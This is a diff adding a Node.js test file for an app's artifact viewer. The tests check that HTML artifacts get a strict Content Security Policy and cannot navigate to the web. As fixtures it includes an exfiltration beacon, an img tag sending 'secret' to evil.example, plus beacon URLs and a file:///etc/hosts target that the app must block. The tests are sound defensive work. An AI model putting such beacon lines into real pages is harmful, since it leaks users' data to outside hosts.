@@ -1,0 +1,55 @@
+// The browser's hardening, headless: what the artifact: scheme answers (every response carries the CSP that keeps
+// an HTML artifact from sending anything out), and the pure rules and tool paths the later fixes add. The same in the
+// real app: test/live/browser-hardening.js.
+// Run: npm run build && node test/browser-hardening.js
+const path = require('node:path');
+const fs = require('node:fs');
+const os = require('node:os');
+const projectDir = process.argv[2] || path.join(__dirname, '..');
+const dist = (p) => require(path.join(projectDir, 'dist/main', p));
+const { ArtifactStore, ARTIFACT_CSP, serveArtifactRequest } = dist('artifacts.js');
+const { leavesArtifact } = dist('browser/popups.js');
+const { check, done } = require('./support/check.js');
+
+/** The CSP's directives as { name: [tokens] }. */
+const directives = (csp) => Object.fromEntries(csp.split(';').map((d) => d.trim().split(/\s+/)).filter((p) => p[0]).map(([k, ...v]) => [k, v]));
+
+(async () => {
+  // ---------- 1. HTML artifacts send nothing out ----------
+  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'oa-browser-hardening-'));
+  const store = new ArtifactStore({ root: path.join(tmp, 'artifacts'), rendererDir: path.join(tmp, 'renderer') });
+  const session = { id: 'sess-1', artifacts: {} };
+  const html = store.save(session, { title: 'Beacon', kind: 'html', content: '<!doctype html><img src="https://evil.example/?d=secret">' }).info;
+  const md = store.save(session, { title: 'Notes', kind: 'markdown', content: '# Notes' }).info;
+  const fetchFile = async (url) => new Response(fs.readFileSync(new URL(url)), { headers: { 'content-type': url.endsWith('.html') ? 'text/html' : 'application/octet-stream' } });
+
+  let res = await serveArtifactRequest(html.url, store, fetchFile);
+  check('an HTML artifact is served', res.status === 200 && (await res.text()).includes('evil.example'));
+  check('… with the artifact CSP header', res.headers.get('content-security-policy') === ARTIFACT_CSP, res.headers.get('content-security-policy'));
+  check('… and its own content type', /text\/html/.test(res.headers.get('content-type') ?? ''));
+  const d = directives(ARTIFACT_CSP);
+  check('the CSP sends nothing: connect-src, form-action, frame-src and object-src are none', ['connect-src', 'form-action', 'frame-src', 'object-src', 'default-src', 'base-uri'].every((k) => d[k]?.join(' ') === "'none'"), d);
+  check('… images, media and workers only from the artifact, data: and blob:', d['img-src'].join(' ') === "'self' data: blob:" && d['media-src'].join(' ') === "'self' data: blob:" && d['worker-src'].join(' ') === "'self' blob:", d);
+  check('a chart artifact may load its script from the allowed CDNs', ['https://cdn.jsdelivr.net', 'https://cdnjs.cloudflare.com', 'https://unpkg.com'].every((h) => d['script-src'].includes(h)) && d['script-src'].includes("'unsafe-inline'"), d['script-src']);
+  check('… and no other host', d['script-src'].filter((t) => /^https:/.test(t)).length === 3 && !d['script-src'].includes('https:') && !d['script-src'].includes('*'), d['script-src']);
+  check('styles may come from the CDNs and Google Fonts, fonts from gstatic', d['style-src'].includes('https://fonts.googleapis.com') && d['font-src'].includes('https://fonts.gstatic.com'), d);
+
+  res = await serveArtifactRequest(`artifact://view/${session.id}/files/${path.basename(html.path)}`, store, fetchFile);
+  check('the same HTML opened through its files/ address carries the CSP too', res.status === 200 && res.headers.get('content-security-policy') === ARTIFACT_CSP);
+  res = await serveArtifactRequest(md.url, store, fetchFile);
+  const page = await res.text();
+  check('the Markdown viewer carries the CSP header', res.headers.get('content-security-policy') === ARTIFACT_CSP);
+  check("… and keeps its stricter meta policy (script-src 'self' only)", page.includes(`<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self';`));
+  res = await serveArtifactRequest('artifact://view/sess-1/nothing-here', store, fetchFile);
+  check('a missing artifact is a 404, with the CSP', res.status === 404 && res.headers.get('content-security-policy') === ARTIFACT_CSP);
+
+  check('an artifact page leaving for the web is blocked', leavesArtifact(html.url, 'https://evil.example/?d=x') && leavesArtifact(html.url, 'http://127.0.0.1:9/beacon'));
+  check('… for data:, blob:, file: and about:blank too', ['data:text/html,hi', 'blob:artifact://view/x', 'file:///etc/hosts', 'about:blank'].every((u) => leavesArtifact(html.url, u)));
+  check('… but another artifact is fine, and a web page may go anywhere', !leavesArtifact(html.url, md.url) && !leavesArtifact('https://a.example/', 'https://b.example/') && !leavesArtifact('', 'https://b.example/'));
+
+  fs.rmSync(tmp, { recursive: true, force: true });
+  done();
+})().catch((err) => {
+  console.error('CRASH', err);
+  process.exit(1);
+});
